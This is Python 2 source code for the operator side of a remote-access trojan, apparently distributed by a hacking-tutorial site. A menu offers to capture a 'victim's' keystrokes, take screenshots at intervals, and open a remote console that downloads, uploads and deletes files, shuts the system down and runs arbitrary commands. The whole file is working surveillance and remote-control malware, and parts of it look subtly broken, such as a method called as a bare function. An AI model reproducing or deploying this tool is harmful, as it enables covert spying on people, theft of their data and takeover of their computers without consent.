import socket
import sys
import os
from time import sleep
class back():
	def back_dir(self,current_path):
                	c=current_path.split('\\')
                	new_path=''
                	i=0
                	while i<len(c)-1:
                        	if i!=0:
                                	new_path=new_path+"\\"+c[i]
                        	else:
                                	new_path=c[i]
                        	i+=1
                	os.chdir(new_path)

class grab_ip():
	def __init__(self):
        	pc_detail=socket.gethostbyname_ex(socket.gethostname())
        	self.ip=pc_detail[2][-1]
		
	def give_ip(self):
		return self.ip


getip=grab_ip()
ip=getip.give_ip()



#creat a tcp socket to listen on every time same!!
server=socket.socket(socket.AF_INET , socket.SOCK_STREAM)

#prevent from address already in use !!ever time same
server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

#bind the socket to port 8081 on all interface
server_address=(ip,8081)
os.system('cls')
print "starting server on %s                    HACKINGSIMPLIFIED.COM" % ip
#print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                           HACKINGSIMPLIFIED.COM"
server.bind(server_address)# finally making server at local host

#listen for connection
server.listen(5)#program will wait for client request


#wait for one incoming connection
connection,client_address=server.accept()#this will accept the req by client
print "connection from",connection.getpeername()

#let's recive msg
a=0
count=0
spacecount=0

option=raw_input('this tool was developed by prabhat awasthi\nand downloaded from hackingsimplified.com\n\nEnter your choice\n\n1==keylogger (snif victims keylogs)\n2==screenshots(take screenshots of victim machine)\n3==get console(start a cmd or terminal of victims machine in your pc)\n\nYour Choice=')

try:
    connection.send(str(option))
except:
    raw_input('fail')

if option=='1':
    server.close()

    #creat a tcp socket to listen on every time same!!
    server=socket.socket(socket.AF_INET , socket.SOCK_STREAM)

    #prevent from address already in use !!ever time same
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

    #bind the socket to port 8081 on all interface
    server_address=(ip,10000)
    print "starting up on %s port %s " % server_address
    server.bind(server_address)# finally making server at local host

    #listen for connection
    server.listen(5)#program will wait for client request


    #wait for one incoming connection
    connection,client_address=server.accept()#this will accept the req by client
    print "connection from",connection.getpeername()
    
    
    os.system('cls')
    #f=open('keystrokes.txt','w')
    #f.close()
    print '1.)simple KeyLlogger started for--->'+str(connection.getpeername())
    back_dir(os.getcwd())
    os.chdir('keystrokes')
    while a==0:
        data=connection.recv(16384)#rec data of 16 kb limit at a time
        if data==' ':
            spacecount+=1
            if spacecount%8==0:
                f=open('keystrokes.txt','a')
                f.write("\n")
                f.close()
            
        f=open('keystrokes.txt','a')
        f.write(data)
        f.close()
        count+=1
        os.system('cls')
        print 'key logger started for--->'+str(connection.getpeername())+'         HACKINGSIMPLIFIED.COM'
        print str(count)+" keystrokes recived"



elif option=='2':
    
    ss=0
    os.system('cls')
    server.close()

    #creat a tcp socket to listen on every time same!!
    server=socket.socket(socket.AF_INET , socket.SOCK_STREAM)

    #prevent from address already in use !!ever time same
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

    #bind the socket to port 8081 on all interface
    server_address=(ip,4444)
    print "starting up on %s port %s " % server_address
    server.bind(server_address)# finally making server at local host

    #listen for connection
    server.listen(5)#program will wait for client request


    #wait for one incoming connection
    connection,client_address=server.accept()#this will accept the req by client
    print "connection from",connection.getpeername()
    os.system('cls')
    time_interval=raw_input('\nEnter the time interval for screenshots in secs=')
    os.system('cls')
    print "Getting ScreenShots Started from %s  HACKINGSIMPLIFIED.COM" %str(connection.getpeername())
    connection.send(time_interval)
    back_dir(os.getcwd())
    os.chdir('screenshots')
    while True:
        sleep(float(time_interval))
        data=connection.recv(1024)
        
        while data[-7:] !="stop it":
            
            filename=str(ss)+'.png'
            f=open(filename,'ab')
            f.write(data)
            f.close()
            data = ''
            data=connection.recv(1024)
    
            
        ss=ss+1
        os.system('cls')
        print "Getting ScreenShots Started from %s  HACKINGSIMPLIFIED.COM" %str(connection.getpeername())
        print str(ss)+' SCREENSHOTS TAKEN!!!!'
        
    

elif option=='3':
    server.close()

    #creat a tcp socket to listen on every time same!!
    server=socket.socket(socket.AF_INET , socket.SOCK_STREAM)

    #prevent from address already in use !!ever time same
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

    #bind the socket to port 8081 on all interface
    server_address=(ip,10008)
    print "starting up on %s port %s " % server_address
    server.bind(server_address)# finally making server at local host

    #listen for connection
    server.listen(5)#program will wait for client request


    #wait for one incoming connection
    connection,client_address=server.accept()#this will accept the req by client
    print "connection from",connection.getpeername()
    os.system('cls')
    #print "Getting ScreenShots Started from %s" %str(connection.getpeername())
    
    print "Starting OS Console On "+str(connection.getpeername())+'        HACKINGSIMPLIFIED.COM'
    
    
    while True:
        print "                           HACKINGSIMPLIFIED.COM\n"
        command=raw_input(str(connection.getpeername())+' >>>')
        if command=="help":
            print "ls             ->listing files in current directory"
            print 'cd dirname     ->to change directory'
            print 'cd..           ->to reverse directory'
            print 'get filename   ->to download a file in current directory'
            print 'upload filename->to upload file from currect directory'
            print 'pwd            ->to get present working directory'
            print 'mkdir dirname  ->to create a directory'
            print 'del_f filename ->to delete a file'
            print 'del_d dirname  ->to delete the directory'
            print 'clear          ->clear screen'
            #print 'snap           ->to get snap shot from camera'
            print 'shutdown       ->to shutdown the system'
            print 'cmd command    ->to execute others cmd commands(some of them may not work)'

        elif command=="ls":
            connection.send('ls')
            data=connection.recv(16384)
            data=data.split('$$%%')
            i=0
            while i<len(data):
                print data[i]
                i+=1

        elif command[:4]=="get ":
            connection.send(command)
            donesize=0
            size=connection.recv(1024)
            data=connection.recv(2048)
            while data[-7:]!='stop it':
                f=open(command[4:],'ab')
                f.write(data)
                f.close()
                donesize=donesize+len(data)
                os.system('cls')
                print "Downloaded==>"+str((int(donesize)/int(size))*100)+" percent"
                data=''
                data=connection.recv(2048)
                
        elif command[:7]=="upload ":
            connection.send(command)
            donesize=0
            size=os.path.getsize(command[7:])
            connection.send(str(size))
            f=open(command[7:],'rb')
            data=f.read(2048)
            connection.send(data)
            while data!="":
                data=''
                data=f.read(2048)
                if data=="":
                    connection.send('stop it')
                else:
                    connection.send(data)

        elif command=="pwd":
            connection.send(command)
            path=connection.recv(1024)
            print path
            
        elif command=="clear":
            try:
                os.system('cls')
            except:
                os.system('clear')
            
            
        else:
            connection.send(command)
            
            
            
    

